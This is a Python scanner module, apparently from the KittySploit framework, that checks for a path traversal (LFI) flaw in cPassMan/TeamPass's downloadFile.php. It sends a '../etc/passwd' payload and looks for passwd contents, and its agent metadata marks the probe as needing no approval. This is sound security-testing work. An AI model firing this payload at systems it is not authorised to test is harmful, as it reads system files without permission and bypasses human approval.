#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects cPassMan path LFI via sources/downloadFile."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'cPassMan - downloadFile.php LFI Detection',
        'description': (
            'Detects cPassMan path LFI via sources/downloadFile.php?path=../../../../etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cpassman', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.securityfocus.com/bid/48959',
        ],
    }

    def run(self):
        trav = '../../../../../../../etc/passwd'
        for base in ('', '/cpassman', '/TeamPass', '/teampass'):
            path = f'{base}/sources/downloadFile.php?path={trav}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(severity='high', reason='cPassMan downloadFile.php LFI', path=f'{base}/sources/downloadFile.php')
                return True
        return False

